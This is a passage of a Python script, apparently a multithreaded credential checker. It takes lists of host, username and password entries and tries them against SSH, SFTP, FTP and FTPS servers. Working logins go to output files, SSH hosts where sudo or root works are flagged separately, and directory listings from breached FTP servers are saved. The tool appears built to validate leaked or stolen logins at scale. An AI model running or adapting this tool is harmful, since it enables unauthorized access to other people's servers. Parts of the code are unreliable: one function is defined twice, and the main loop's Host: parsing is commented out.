        paramiko.AuthenticationException
    ):  # Use paramiko's AuthenticationException instead
        script_logger.info(
            f"🔑 Authentication failed for SFTP {username}@{host}:{port}"
        )
    except (paramiko.SSHException, Exception) as e:  # Catch broader exceptions
        if "authentication" in str(e).lower():
            script_logger.info(
                f"🔑 Authentication failed for SFTP {username}@{host}:{port}"
            )
        else:
            script_logger.info(f"🚫 SFTP connection error to {host}:{port}: {e}")
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for SFTP {host}:{port}.")
    except Exception as e:
        script_logger.error(f"⚠️ Unexpected error in SFTP: {e}", exc_info=True)
    return None


def check_ftp_login(host, port, username, password, conn_timeout):
    """Attempts to establish an FTP connection."""
    try:
        script_logger.debug(
            f"Trying FTP connection ({username}:{password}@{host}:{port})"
        )
        with ftplib.FTP(timeout=conn_timeout) as ftp:
            ftp.connect(host, port)
            ftp.login(username, password)
            script_logger.info(
                f"Connected to FTP server {host}:{port} with {username}:{password}"
            )
            ls = []
            ftp.retrlines("LIST -a", ls.append)
            with FILE_LOCKS["checked_ftp_dirs.txt"]:
                with open(
                    "checked_ftp_dirs.txt", "a", encoding="utf-8"
                ) as ftp_dir_output:
                    ftp_dir_output.write(
                        f"\n\nFTP://{username}:{password}@{host}:{port}\n"
                    )
                    for entry in ls:
                        ftp_dir_output.write(f"{entry}\n")
            return "FTP"
    except ftplib.error_perm as e:
        script_logger.info(f"🔑 FTP login failed for {username}@{host}:{port}: {e}")
    except ftplib.all_errors as e:
        script_logger.info(f"🚫 FTP connection or protocol error to {host}:{port}: {e}")
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for FTP {host}:{port}.")
    except Exception as e:
        script_logger.error(f"⚠️ Unexpected error in FTP: {e}", exc_info=True)
    return None


def check_ftps_login(host, port, username, password, conn_timeout):
    """Attempts to establish an FTPS connection."""
    try:
        script_logger.debug(
            f"Trying FTPS connection ({username}:{password}@{host}:{port})"
        )
        with ftplib.FTP_TLS(timeout=conn_timeout) as ftps:
            ftps.connect(host, port)
            ftps.login(username, password)
            script_logger.info(
                f"Connected to FTPS server {host}:{port} with {username}:{password}"
            )
            ftps.prot_p()
            ls = []
            ftps.retrlines("LIST -a", ls.append)
            with FILE_LOCKS["checked_ftps_dirs.txt"]:
                with open(
                    "checked_ftps_dirs.txt", "a", encoding="utf-8"
                ) as ftps_dir_output:
                    ftps_dir_output.write(
                        f"\n\nFTPS://{username}:{password}@{host}:{port}\n"
                    )
                    for entry in ls:
                        ftps_dir_output.write(f"{entry}\n")
            return "FTPS"
    except ftplib.error_perm as e:
        script_logger.info(f"🔑 FTPS login failed for {username}@{host}:{port}: {e}")
    except ftplib.all_errors as e:
        script_logger.info(
            f"🚫 FTPS connection or protocol error to {host}:{port}: {e}"
        )
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for FTPS {host}:{port}.")
    except Exception as e:
        script_logger.error(f"⚠️ Unexpected error in FTPS: {e}", exc_info=True)
    return None


def write_to_output(
    protocol,
    username,
    password,
    host,
    port,
    sudo_available=False,
    su_root_available=False,
):
    """Writes successful login information to various output files."""
    output_line = f"{protocol}://{username}:{password}@{host}:{port}\n"

    # Always write to a main combined output file
    with FILE_LOCKS["output.txt"]:
        with open("output.txt", "a", encoding="utf-8") as output_file:
            output_file.write(output_line)

    # Write to protocol-specific success files
    output_filename_map = {
        "SSH": "checked_ssh.txt",
        "FTP": "checked_ftp.txt",
        "FTPS": "checked_ftps.txt",
        "SFTP": "checked_sftp.txt",
    }
    if protocol in output_filename_map:
        with FILE_LOCKS[output_filename_map[protocol]]:
            with open(
                output_filename_map[protocol], "a", encoding="utf-8"
            ) as output_file:
                output_file.write(output_line)

    # Handle SSH-specific root access files
    if protocol == "SSH" and (sudo_available or su_root_available):
        root_access_entry = output_line

        with FILE_LOCKS["root_access.txt"]:
            with open("root_access.txt", "a", encoding="utf-8") as root_file:
                root_file.write(root_access_entry)

        if sudo_available:  # Can be more specific if needed
            with FILE_LOCKS["root_sudo.txt"]:
                with open("root_sudo.txt", "a", encoding="utf-8") as sudo_output_file:
                    sudo_output_file.write(root_access_entry)


# Then fix the remove_checked_hosts_by_counter function
def remove_checked_hosts_by_counter(sourcefile, batch_size=20):
    """
    Removes the first batch_size hosts from the sourcefile.
    Each host entry can be in one of two formats:
    1. SSH://username:password@host:port
    2. Host:host:port followed by Username:username and Password:password
    """
    try:
        # Make sure the file exists
        if not os.path.exists(sourcefile):
            logger.error(f"Source file {sourcefile} does not exist")
            return

        # Read all lines from the file
        with open(sourcefile, "r", encoding="utf-8", errors="ignore") as src_file:
            lines = src_file.readlines()

        if not lines:
            logger.warning(f"Source file {sourcefile} is empty")
            return

        # Log the first few lines to debug
        logger.debug(f"First 5 lines of sourcefile: {lines[:5]}")

        # Count how many lines to remove
        lines_to_remove = 0
        hosts_removed = 0
        i = 0

        while i < len(lines) and hosts_removed < batch_size:
            line = lines[i].strip()
            logger.debug(f"Processing line {i}: {line}")

            if line.startswith("SSH://"):
                lines_to_remove += 1
                hosts_removed += 1
                logger.debug(f"Found SSH URL at line {i}, removing 1 line")
                i += 1
            elif line.startswith("Host:"):
                if i + 2 < len(lines):
                    host_line = lines[i].strip()
                    username_line = lines[i + 1].strip()
                    password_line = lines[i + 2].strip()

                    if username_line.startswith(
                        "Username:"
                    ) and password_line.startswith("Password:"):
                        lines_to_remove += 3
                        hosts_removed += 1
                        i += 3
                        logger.debug(
                            f"Removing 3 lines for Host/Username/Password starting at line {i - 3}"
                        )
                    else:
                        logger.warning(
                            f"Incomplete host entry at line {i}. Expected Username: and Password: on the following lines."
                        )
                        i += 1  # Move to the next line to avoid infinite loop
                else:
                    logger.warning(
                        f"Incomplete host entry at line {i}. Not enough lines remaining."
                    )
                    i += 1
            else:
                i += 1  # Move to the next line if it doesn't match any known format

        # If we found hosts to remove
        if lines_to_remove > 0:
            logger.info(
                f"Found {lines_to_remove} lines to remove for {hosts_removed} hosts"
            )

            # Keep only the remaining lines
            remaining_lines = lines[lines_to_remove:]

            # Write the remaining lines back to the file
            with open(sourcefile, "w", encoding="utf-8") as src_file:
                src_file.writelines(remaining_lines)

            logger.info(
                f"Removed {hosts_removed} hosts ({lines_to_remove} lines) from {sourcefile}"
            )
        else:
            logger.warning(f"No hosts found to remove from {sourcefile}")

    except Exception as e:
        logger.error(f"Error in remove_checked_hosts_by_counter: {e}")


def parse_input_file(file_path: str) -> list:
    """Parse the input file for login details, handling both SSH:// and Host: formats"""
    login_info = []
    try:
        with open(file_path, "r") as file:
            lines = file.readlines()
            i = 0
            while i < len(lines):
                line = lines[i].strip()
                if line.startswith("SSH://"):
                    parsed = parse_ssh_url(line)
                    if parsed:
                        login_info.append(parsed)
                    i += 1
                elif line.startswith("Host:"):
                    host_match = re.search(r"Host:(.*?)(?::(\d+))?$", line)
                    if host_match:
                        host = host_match.group(1).strip()
                        port_str = host_match.group(2)
                        port = int(port_str) if port_str else 22
                        if i + 2 < len(lines):
                            username_line = lines[i + 1].strip()
                            password_line = lines[i + 2].strip()
                            if username_line.startswith(
                                "Username:"
                            ) and password_line.startswith("Password:"):
                                username = username_line.split(":")[1].strip()
                                password = password_line.split(":")[1].strip()
                                login_info.append((host, port, username, password))
                                i += 3
                            else:
                                logger.warning(
                                    f"Incomplete login info after Host: line {i+1}. Expected Username: and Password:."
                                )
                                i += 1
                        else:
                            logger.warning(
                                f"Incomplete login info after Host: line {i+1}. Not enough lines left in file."
                            )
                            i += 1
                    else:
                        logger.warning(f"Invalid Host: line format: {line}")
                        i += 1
                else:
                    i += 1

    except FileNotFoundError:
        logger.error("Input file not found: %s", file_path)
        raise
    except Exception as e:
        logger.error("Error reading input file: %s", str(e))
        raise

    global TOTAL_LINES
    try:
        with open(file_path, "r") as f:
            TOTAL_LINES = sum(1 for _ in f)
    except FileNotFoundError:
        logger.error(f"Could not open {file_path} to count lines.")
        TOTAL_LINES = 0

    return login_info


def remove_checked_hosts_by_counter(sourcefile, batch_size=300):
    """Removes the first batch_size hosts from the sourcefile."""
    try:
        if not os.path.exists(sourcefile):
            script_logger.error(f"Source file {sourcefile} does not exist")
            return

        with open(sourcefile, "r", encoding="utf-8", errors="ignore") as src_file:
            lines = src_file.readlines()

        if not lines:
            script_logger.warning(f"Source file {sourcefile} is empty")
            return

        lines_to_remove_count = 0
        hosts_removed_count = 0
        current_line_idx = 0

        while current_line_idx < len(lines) and hosts_removed_count < batch_size:
            line = lines[current_line_idx].strip()

            if line.startswith("SSH://"):
                lines_to_remove_count += 1
                hosts_removed_count += 1
                current_line_idx += 1
            elif line.startswith("Host:"):
                if (
                    current_line_idx + 2 < len(lines)
                    and lines[current_line_idx + 1].strip().startswith("Username:")
                    and lines[current_line_idx + 2].strip().startswith("Password:")
                ):
                    lines_to_remove_count += 3
                    hosts_removed_count += 1
                    current_line_idx += 3
                else:
                    current_line_idx += 1
            else:
                current_line_idx += 1

        if lines_to_remove_count > 0:
            remaining_lines = lines[lines_to_remove_count:]
            with FILE_LOCKS["sourcefile"]:
                with open(sourcefile, "w", encoding="utf-8") as src_file:
                    src_file.writelines(remaining_lines)
            script_logger.debug(
                f"Removed {hosts_removed_count} hosts ({lines_to_remove_count} lines) from {sourcefile}"
            )

    except Exception as e:
        script_logger.error(
            f"Error removing checked hosts from {sourcefile}: {e}", exc_info=True
        )


if __name__ == "__main__":
    hosts_checked_since_last_removal = 0
    start_time_main = time.time()
    all_tasks = []

    try:
        with open(args.file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line.startswith("SSH://") or line.startswith("Host:"):
                    TOTAL_LINES += 1
    except FileNotFoundError:
        script_logger.critical(f"Input file not found: {args.file}")
        sys.exit(1)
    except Exception as e:
        script_logger.critical(f"Error reading input file {args.file}: {e}")
        sys.exit(1)

    if TOTAL_LINES == 0:
        script_logger.critical(
            f"No valid host entries found in '{args.file}'. Exiting."
        )
        sys.exit(0)

    # Initialize stats after you have TOTAL_LINES
    stats = MultiProtocolFancyStats(
        total_hosts=TOTAL_LINES,
        filename=args.file,
        protocols=protocols,
        threads=args.threads,
    )

    # Start stats display
    stats.start()
    time.sleep(1)  # Give display time to start

    try:
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=args.threads
        ) as executor:
            # Set active threads for stats
            if stats:
                stats.set_active_threads(args.threads)
                stats.add_output(f"🚀 Starting scan with {args.threads} threads")

            try:
                with open(args.file, "r", encoding="utf-8", errors="ignore") as f:
                    lines_buffer = []
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue

                        if line.startswith("SSH://"):
                            host_info = parse_ssh_url(line)
                            if host_info:
                                host, port, username, password = host_info
                                if "SSH" in protocols:
                                    all_tasks.append(
                                        executor.submit(
                                            check_login_thread,
                                            host,
                                            port,
                                            username,
                                            password,
                                            timeout,
                                            "SSH",
                                            args.file,
                                            start_time_main,
                                        )
                                    )
                        elif line.startswith("Host:"):
                            if lines_buffer:
                                lines_buffer = []
                            lines_buffer.append(line)
                        elif line.startswith("Username:") and len(lines_buffer) == 1:
                            lines_buffer.append(line)
                        elif line.startswith("Password:") and len(lines_buffer) == 2:
                            lines_buffer.append(line)

                            # Parse the host/username/password block
                            host_part = lines_buffer[0].split(":", 1)[1].strip()
                            username = lines_buffer[1].split(":", 1)[1].strip()
                            password = lines_buffer[2].split(":", 1)[1].strip()

                        #     # FIXED: ALWAYS use the port specified in the source file
                        #     # Handle host:port format - NO DEFAULT PORT FALLBACK
                        #     if ":" in host_part:
                        #         host, port_str = host_part.rsplit(":", 1)
                        #         try:
                        #             port = int(port_str)
                        #         except ValueError:
                        #             script_logger.error(
                        #                 f"Invalid port format in: {host_part}"
                        #             )
                        #             lines_buffer = []
                        #             continue
                        #     else:
                        #         script_logger.error(
                        #             f"No port specified in host entry: {host_part}"
                        #         )
                        #         lines_buffer = []
                        #         continue
                        #     lines_buffer = []
                        # else:
                        #     lines_buffer = []

            except Exception as e:
                script_logger.error(f"Error processing input file: {e}", exc_info=True)
                if stats:
                    stats.add_output(f"❌ Error processing file: {str(e)[:50]}")

            # Wait for all tasks to complete
            if stats:
                stats.add_output(
                    f"⏳ Waiting for {len(all_tasks)} tasks to complete..."
                )

            completed_tasks = 0
            for future in concurrent.futures.as_completed(all_tasks):
                try:
                    result = future.result()
                    completed_tasks += 1

                    # Update active threads count
                    remaining_tasks = len(all_tasks) - completed_tasks
                    active_threads = min(args.threads, remaining_tasks)
                    if stats:
                        stats.set_active_threads(active_threads)

                except Exception as exc:
                    script_logger.error(
                        f"Task generated an exception: {exc}", exc_info=True
                    )
                    if stats:
                        stats.add_output(f"❌ Task error: {str(exc)[:50]}")

    except KeyboardInterrupt:
        script_logger.info("Scan interrupted by user")
        if stats:
            stats.add_output("🛑 Scan interrupted by user")
    except Exception as e:
        script_logger.error(f"Unexpected error in main execution: {e}", exc_info=True)
        if stats:
            stats.add_output(f"❌ Unexpected error: {str(e)[:50]}")
    finally:
        # Final stats update
        if stats:
            stats.set_active_threads(0)
            stats.add_output("🎉 Scan completed!")
            time.sleep(3)  # Show final results
            stats.stop()

    # Print final summary
    print_login_attempts(TOTAL_LINES, start_time_main)
    console.print("\n[bold cyan]Scanning complete![/bold cyan]\n")
